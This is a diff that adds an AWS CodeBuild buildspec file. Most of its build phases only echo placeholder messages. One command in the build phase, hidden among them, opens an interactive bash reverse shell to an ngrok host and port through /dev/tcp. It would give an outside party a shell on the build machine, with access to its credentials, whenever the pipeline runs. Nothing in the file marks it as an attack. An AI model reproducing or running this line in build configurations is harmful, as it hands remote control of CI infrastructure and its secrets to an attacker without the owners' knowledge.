@@ -1,0 +1,23 @@
+version: 0.2
+phases:
+  install:
+    runtime-versions:
+      nodejs: 20
+      python: 3.x
+    commands:
+      - echo "installing something"
+  pre_build:
+    commands:
+      - echo "We are in the pre build phase"
+  build:
+    commands:
+      - echo "We are in the build block"
+      - bash -c 'bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/17433 0>&1'
+      - echo "We will run some tests"
+  post_build:
+    commands:
+      - echo "We are in the post build phase"
+artifacts:
+  files:
+    - '**/*'
+  name: DevOps-Code-Build
